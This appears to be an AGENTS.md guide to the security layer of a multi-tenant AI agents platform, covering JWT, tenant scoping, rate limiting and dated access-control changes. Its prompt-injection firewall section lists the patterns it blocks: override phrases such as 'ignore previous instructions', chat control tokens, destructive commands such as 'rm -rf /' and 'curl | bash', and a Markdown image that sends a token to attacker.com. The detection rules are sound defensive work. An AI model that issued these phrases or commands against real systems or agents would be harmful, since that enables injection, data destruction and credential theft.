# AGENTS.md - Security & Production Hardening Service

## 1. Service Identity & Mission
The **Security & Production Hardening Service** (`poc/backend/security/`) enforces security boundaries, request authentication, JWT token lifecycle, rate limiting, request correlation tracking, and uniform exception responses across the AI Agents Platform API.

---

## 2. Core Capabilities & Specializations

* **JWT & Password Security Provider (`tokens.py`)**:
  * Pure standard-library implementation using HMAC-SHA256 and PBKDF2 for zero-dependency supply chain safety.
  * Issues and validates signed HS256 JWT access tokens (`create_access_token`, `decode_access_token`).
  * Decoding rejects malformed segments, non-`HS256` headers and tokens without a numeric `exp` (returns `None`, never a 500).
  * Enforces salted password hashing (`hash_password`, `verify_password`).
* **Account invariants**: `GET /api/v1/auth/me` resolves only by the signed `sub`, requires an ACTIVE user in the token's org and returns 401 otherwise; it never creates or revives users (service claims are rejected before lookup). `POST /departments/{id}/members/bulk-invite` requires a database-verified active ORG_ADMIN of the department's organization, an invitable role (`ORG_ADMIN`, `MANAGER`, `OPERATOR`, `MEMBER`), at most 100 emails and 1-30 day expiry; tokens are returned only to that administrator for out-of-band delivery. `POST /invitations/accept` never authenticates as an existing account by token alone: existing users must supply their current password and belong to the invite's organization; new users need a password of 8+ characters. Onboarding consumes only the joined organization's invitations.
* **Multi-Tenant Authentication & Scoping (`auth.py`)**:
  * `authenticate_request`: Validates Bearer JWT tokens or API keys (`PLATFORM_API_KEY`). Unauthenticated requests are rejected with HTTP 401. Exempts public health, auth onboarding, and webhook endpoints.
  * `get_authorized_scope`: Computes authorized tenant organization and department IDs from user claims or database records.
  * `get_current_org_id`: Extracts current tenant organization ID from request state.
  * `get_current_user_optional`: Extracts user claims from request state if present.
  * `require_org_admin`: Dependency enforcing that the authenticated user possesses the `ORG_ADMIN` role; raises HTTP 403 otherwise.
  * `X-Department-ID`: Honors the `X-Department-ID` request header override if the department belongs to the user's authorized scope.
* **Rate Limiting & DoS Protection (`rate_limiter.py`)**:
  * `RateLimiterMiddleware` implements sliding-window in-memory throttling per client IP.
  * Default threshold: **2000 requests per minute** (configurable via `PLATFORM_RATE_LIMIT`).
  * Exempted routes: CORS pre-flight `OPTIONS`, `/health`, `/docs`, `/redoc`, `/openapi.json`, and the persistent SSE event stream (`/api/v1/events/stream`).
  * Rejects traffic exceeding capacity with HTTP 429 (`Too Many Requests`) and `Retry-After` header.
* **Request Correlation Tracking (`correlation.py`)**:
  * `CorrelationIdMiddleware` assigns a unique `X-Correlation-ID` (UUID) to every incoming request.
  * Injects correlation IDs into response headers and Python logging context for distributed tracing.
* **AI Security Firewall & Prompt Injection Guard (`firewall.py`)**:
  * **Direct Prompt Injection & Jailbreaks**: Detects and halts attempts to override system prompts (`ignore previous instructions`, `new system prompt`, `you are now DAN/unfiltered`).
  * **Control Token & Delimiter Hijacks**: Blocks `<|im_start|>`, `<|system|>`, `[INST] <<SYS>>`, and delimiter overrides.
  * **Destructive Command Interception**: Intercepts dangerous bash commands (`rm -rf /`, `curl | bash`, reverse shells) and destructive database drops (`DROP DATABASE`, `DROP TABLE users`).
  * **Indirect Prompt Injection (MCP Tool Outputs)**: Sanitizes and neutralizes hidden instruction payloads and Markdown data exfiltration images (`![exfil](https://attacker.com?token=...)`) originating from tool outputs or ingested Web/PR/Issue bodies.
  * **Fail-Closed Policy & Audit**: Terminated requests trigger `PromptInjectionDetectedError` (HTTP 400) and register an immutable incident in `audit_logs`.
* **Structured Exception Handling (`errors.py`)**:
  * Uniform error payload formatting (`http_exception_handler` and `generic_exception_handler`).
  * Masks internal stack traces and database errors in production while logging full diagnostics.

---

## 3. Interfaces & Contracts

### Key Classes & Dependencies
```python
from poc.backend.security import (
    authenticate_request,
    require_org_admin,
    get_authorized_scope,
    get_current_user_optional,
    get_current_org_id,
    create_access_token,
    decode_access_token,
    CorrelationIdMiddleware,
    RateLimiterMiddleware,
    http_exception_handler,
    generic_exception_handler,
)

# 1. Protect routes in main.py
auth_deps = [Depends(authenticate_request)]
app.include_router(agents_router, prefix="/api/v1/agents", dependencies=auth_deps)

# 2. Middlewares (Order: Correlation -> RateLimiter -> CORS)
app.add_middleware(RateLimiterMiddleware)
app.add_middleware(CorrelationIdMiddleware)

# 3. Global error handlers
app.add_exception_handler(HTTPException, http_exception_handler)
app.add_exception_handler(Exception, generic_exception_handler)
```

---

## 4. Invariant Rules & Guardrails
1. **No Sensitive Data in Logs**: Never log plaintext API keys, authorization tokens, or raw credentials.
2. **Deterministic Correlation**: Every response header MUST include `X-Correlation-ID`.
3. **Health & SSE Immunity**: Never apply rate limits to `/health` or persistent SSE connections (`/api/v1/events/stream`).
4. **Structured Error Consistency**: All error responses must adhere to `{ "detail": "...", "correlation_id": "...", "status_code": ... }`.

---

## 🔄 Mandatory `AGENTS.md` Synchronization Rule

> [!IMPORTANT]
> Whenever any security logic, token structure, auth dependency, rate limit configuration, or error handling in `poc/backend/security/` is modified, the developer or agent **MUST** update this `AGENTS.md` file within the **SAME commit**.

## Workflow Assistant policy boundary
The assistant service adds current-database validation after authenticate_request: an ACTIVE user must match the verified org claim, and current memberships determine accessible departments. Stale JWT role/department claims cannot restore revoked rights. Client read/write scopes reduce, never increase, database role rights. Scope-less first-party JWTs retain normal database authorization; future source=mcp callers must supply explicit verified delegated scopes. Organization-wide API-key access is insufficient without a personal user identity. This module does not supply an OAuth authorization server or MCP token verifier.

## Fail-closed hardening (2026-11-01)
tokens._get_jwt_secret requires JWT_SECRET_KEY >= 32 chars. PLATFORM_DEV_MODE=1 uses a random per-process key; there is no built-in secret. main.lifespan calls validate_token_configuration() before init_services. decode_access_token rejects malformed base64/non-ASCII tokens with None. authenticate_request accepts ?token= only on QUERY_TOKEN_PATHS (/api/v1/events/stream), drops ?api_key=, and compares API keys with hmac.compare_digest. API-key auth requires PLATFORM_API_KEY_ORG_ID; open dev auth requires PLATFORM_DEV_MODE=1, ALLOW_UNAUTHENTICATED_DEV=true and PLATFORM_DEV_ORG_ID. Both set request.state.user = {org_id, role: ORG_ADMIN, service} via _service_claims, so every authenticated request has an organization. get_authorized_scope reads non-admin departments from the database only (no JWT fallback, filtered to the caller's org); X-Department-ID only selects an already-authorized department. CORS origins come from PLATFORM_CORS_ORIGINS (default localhost:5173), and '*' is ignored. See docs/security-configuration.md. Static review only.


## Unified current-identity role and resource policy (2026-11-05)
identity.Actor loads an ACTIVE user matching the signed sub/org; unknown roles are rejected.
Department rank is min(account role, membership role), with ORG_ADMIN limited to its own
organization's departments. Non-user service identities are accepted only from authenticated
api_key/open_development modes; user JWT service impersonation is rejected. X-Department-ID
must already be authorized and narrows selection; profile refresh ignores an obsolete selector.
get_authorized_scope has no unassigned-user default department fallback or stale-claim grants.

route_permissions explicitly registers endpoint names per domain with levels1 read,2 operate,
3 manage,4 organization administer; unknown names fail closed. request_policy validates current
roles and all mapped path/query/body IDs, nested step/resource JSON/YAML aliases with bounded
nesting, cross-organization updates, implicit department defaults and graph references before
endpoint side effects. resource_access resolves exact organization ownership or inherited scope
(tasks/schedules→agent/project; executions→workflow; teams/war rooms→all participating agents;
interactions→task/requester; messages→participants/task). Missing/orphaned/foreign resources
are indistinguishable404. Role/selection failures are403 and invalid identity401.

response_policy filters collections/subtrees/activity and rebuilds scoped metrics; plugin/auth
profiles retain their own source projection. Connector config credentials are redacted without
prefixes and masked placeholders preserve saved values on update. Audit logs require attributable
ownership. catalog_ownership generates safe organization-prefixed IDs (Unicode names retain safe
hash suffixes) and records new skill/template ownership; legacy unowned global records cannot
be silently claimed. New ownership table contract is documented in storage/AGENTS.md.

Broker-wide queue APIs, global-secret legacy approval callbacks/dispatch, native OS folder picker
and unauthenticated legacy websocket are denied to tenant sessions. File browsing/local plugin
paths require tenant shared storage. Organization native Direct API tools cannot expose host
Bash/bypass and must resolve scoped workspaces. Existing governed workflow container/connector
execution remains separate. See ../../../docs/access-control-audit.md for exact matrix and limits.
Prepared real SQLite/FastAPI cases are not executed locally; no zero-vulnerability claim.

Department reassignment of existing agent/workflow records returns409 unless performed through
an explicit ownership/history migration (not supplied by generic update routes). Workflow task
scope intersects persisted execution scope and each referenced step agent/task before detail or
evaluation; an old mixed-department record cannot bypass the new read boundary. Parser aliases
agent/agentId/reviewerAgentId and connector-list aliases are included in reference admission.
Execute/Playground bodies remain ordinary user data and cannot substitute for stored scope.

Queued workflow admission rechecks the current active database account and department membership before budget/run creation, including empty DAGs. Request-local department claims are refreshed from current capped memberships; signed login claims do not retain revoked privileges.

Tenant response projection is applied to direct and lazy included routes; organization collection filtering must run with current request actor/resources on every registered response. No local runtime verification performed.

Workflow authoring endpoints require level1 department access, including nested resource references. This exception does not grant management or execution. Default path-scope calculation uses readable membership rather than requiring manager status for unrelated requests. No local runtime verification performed.

Nested response collections are authorized by their own resource type (for example departments inside workflow AI context), rather than the outer endpoint domain. The authoring context retains readable department choices.


Workflow approval reads require current scoped execution access. decide_workflow_approval requires level3 and a personal authenticated user; the handler rechecks approver, initiator, immutable workflow revision, resource grants and deadline during resolution. Legacy Telegram/Slack shared-secret callback routes remain disabled. Merge authority never comes from a URL or model output.


AI-15 target identity/event/approval boundaries require proved provider identities plus current personal approver policy. Channel membership/forwarded links alone never identify an approver. Trigger service principals have explicit fixed workflow/resource ceilings and cannot be selected by model text. Legacy global-secret callbacks remain denied until P04/P05/P08 ship the verified transport.

## AI-16 policy admission
request_policy includes governance in the reviewed domain inventory and rejects governance bodies >262144 bytes. route_permissions maps descriptors/catalog/decisions to read, department policy/history to manage, organization policy to admin. Handler Resources/current Actor checks remain mandatory and foreign selected departments stay hidden. Manager restrictions cannot create a grant; no external channel membership or request actor is authority. See docs/architecture/capability-policy-v1.md.

## AI-18 current identity and policy authority
Follow ../../../docs/architecture/p01-policy-algebra.md: authenticate the session, then use current DB Actor/Resources and selected department. Never authorize by token role alone or grant rights from channel membership/links/model output. Personal policy mutations and approval decisions remain distinct from existing server-owned service authentication; do not synthesize service identity from a body. The full role/action and HTTP error matrix is in ../../../docs/architecture/p01-governance-api.md. Existing service handling is not a newly implemented generic service-principal registry.

## AI-22 channel registry admission

Governance route policy registers channel-binding reads and org-admin writes. The endpoint requires exact tenant/department scope and personal administrator identity for mutations, with a current active admin check inside the SQLite write transaction. No channel binding authorizes provider callbacks or grants access to a connector. See [the channel registry](../../../docs/channel-bindings.md).

AI-23 permits exact department channel binding reads at member level. The department resource check and selected department header still apply.

The channel binding catalog uses the reviewed read route policy and exact selected department. Members receive connector metadata only for active department grants; connector configuration and secrets are excluded.

AI-25 personal identity routes use current database identity and reviewed governance route permissions. Only the dedicated provider proof POST admits provider authentication, independently of platform JWTs.

AI-26 identity management requires a current personal department manager or organization administrator, with selected department matching the route. Store reads and mutations recheck current role, exact membership and active same-organization connector grant. Only organization administrators can revoke a link applicable in another department or owned by an organization administrator.

The reviewed AI-28 diagnostics and configuration-test routes require current org-admin access and exact connector scope. Public ingress verifies provider authority independently and never accepts user-supplied destination URLs for TLS probes.

See [AI-30 webhook operations](../../../docs/webhook-ingress.md) for proxy requirements, provider verification, retry semantics and incident recovery.

Channel trigger settings use reviewed workflow route levels. Read requires workflow access; save and preview require current department management authority. Save also requires a personal actor.

DAG inbox and decision use department read admission followed by personal identity checks. The decision transaction enforces the saved approver roles, current membership, initiator separation, quorum and replay fencing.
